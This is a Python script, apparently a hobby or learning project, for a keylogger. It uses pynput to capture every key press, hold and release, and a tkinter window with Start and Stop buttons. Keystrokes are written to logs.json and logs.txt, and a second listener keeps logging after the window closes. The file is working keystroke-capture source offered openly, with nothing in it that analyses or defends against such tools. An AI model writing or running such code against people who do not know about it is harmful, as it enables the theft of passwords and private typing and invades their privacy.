import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

keylogger_listener = None

key_list = []
x = False
key_strokes=""

def update_txt_file(key):
    with open ('logs.txt','w+') as key_strokes:
        key_strokes.write(key)

def update_json_file(key_list):
    with open('logs.json','+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append(
            {'Pressed' :f'{key}'}
        )
        x = True
    if x == True:
        key_list.append(
            {'Held':f'{key}'}
        )
    update_json_file(key_list)
        
           

def on_release(key):
    global x, key_list, key_strokes
    key_list.append(
        {'Released':f'{key}'}
    )
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes = key_strokes+ str(key)
    update_txt_file(str(key_strokes))


def start_keylogger():
    global keylogger_listener
    # Start the keylogger
    keylogger_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    keylogger_listener.start()

def stop_keylogger():
    global keylogger_listener
    # Stop the keylogger
    if keylogger_listener:
        keylogger_listener.stop()
        keylogger_listener = None


window = tk.Tk()
window.title("Keylogger")
window.geometry("300x150")

start_button = tk.Button(window, text="Start Keylogger", command=start_keylogger)
start_button.pack(pady=10)

stop_button = tk.Button(window, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=10)

window.mainloop()



print("[+] Running Keylogger Successfully ! \n[!] Saving the key logs in 'logs.json'")

with keyboard.Listener(
    on_press = on_press,
    on_release = on_release) as Listener:
    Listener.join()



    

